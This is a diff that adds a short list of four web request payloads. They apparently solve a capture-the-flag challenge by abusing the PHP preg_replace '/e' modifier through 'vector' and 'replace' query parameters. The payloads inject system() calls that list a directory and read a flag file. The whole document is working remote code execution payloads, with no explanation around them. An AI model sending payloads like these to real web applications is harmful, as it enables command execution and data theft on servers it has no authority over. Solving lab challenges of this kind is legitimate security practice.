@@ -1,0 +1,5 @@
+/index.php?vector=/Admin/e&replace=system("ls -l")
+/index.php?vector=/Admin/e&replace=system('ls -l')
+
+/index.php?vector=/Admin/e&replace=system('cat here_we_dont_have_flag/flag.txt')
+/index.php?vector=/Admin/e&replace=system("cat here_we_dont_have_flag/flag.txt")
